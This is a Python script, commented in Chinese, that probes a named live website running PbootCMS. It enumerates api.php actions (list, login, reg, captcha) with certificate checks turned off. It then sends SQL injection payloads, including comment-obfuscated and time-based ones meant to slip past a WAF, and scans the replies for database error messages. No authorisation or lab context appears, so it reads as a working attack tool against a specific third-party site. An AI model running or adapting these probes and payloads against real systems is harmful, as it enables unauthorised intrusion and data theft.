#!/usr/bin/env python3
"""pboot_api.py - jrhqd.com PbootCMS api.php 深挖"""
import urllib.request, urllib.parse, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://jrhqd.com'

def fetch(url, timeout=8, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
            headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded'} if data else UA)
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(60000).decode('utf-8', 'ignore'), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(60000).decode('utf-8', 'ignore'), e.geturl()
    except Exception as e:
        return 0, repr(e)[:100], ''

print('=== api.php 内容 ===')
st, b, fu = fetch(BASE + '/api.php')
print('st=%d size=%d body=%s' % (st, len(b), b[:300]))

print('\n=== api.php 参数探测 ===')
for p in ['/api.php?action=list', '/api.php?action=cate', '/api.php?action=detail&id=1',
          '/api.php?action=search&keyword=1', '/api.php?m=index', '/api.php?c=index',
          '/api.php?action=login', '/api.php?action=reg']:
    st, b, fu = fetch(BASE + p)
    print('%s -> st=%d size=%d body=%s' % (p.split('?')[1], st, len(b), b[:120].replace(chr(10), ' ')))

print('\n=== 后台验证码接口 ===')
st, b, fu = fetch(BASE + '/api.php?action=captcha')
print('captcha api: st=%d size=%d' % (st, len(b)))

print('\n=== PbootCMS SQLi payload (绕过WAF) ===')
# WAF拦and, 试其他布尔/报错
payloads = [
    "/index.php?list=1'--",
    "/index.php?list=1'%2b'",
    "/index.php?list=1'/**/and/**/1=1",
    "/index.php?list=1' and sleep(2)--",
    "/index.php?list=1'x",
    "/api.php?action=list&typeid=1'",
]
for p in payloads:
    st, b, fu = fetch(BASE + p)
    err = re.findall(r'SQLSTATE|syntax error|SQL|error|warning', b, re.I)
    print('%s -> st=%d size=%d %s' % (p.split('?')[1], st, len(b), err[:2] if err else ''))
